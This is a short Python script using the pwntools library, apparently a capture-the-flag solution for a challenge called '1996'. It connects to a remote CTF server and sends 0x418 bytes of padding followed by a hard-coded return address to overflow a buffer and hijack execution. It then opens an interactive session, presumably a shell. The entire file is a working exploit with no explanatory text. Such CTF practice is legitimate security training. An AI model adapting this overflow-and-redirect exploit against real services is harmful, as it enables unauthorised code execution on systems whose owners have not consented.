#!/usr/bin/python3

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3013)
e = ELF("./1996")

padding = "A"*0x418

payload = padding.encode('utf-8')
payload += p64(0x0000000000400897)

p.sendlineafter("? ", payload)

p.interactive()
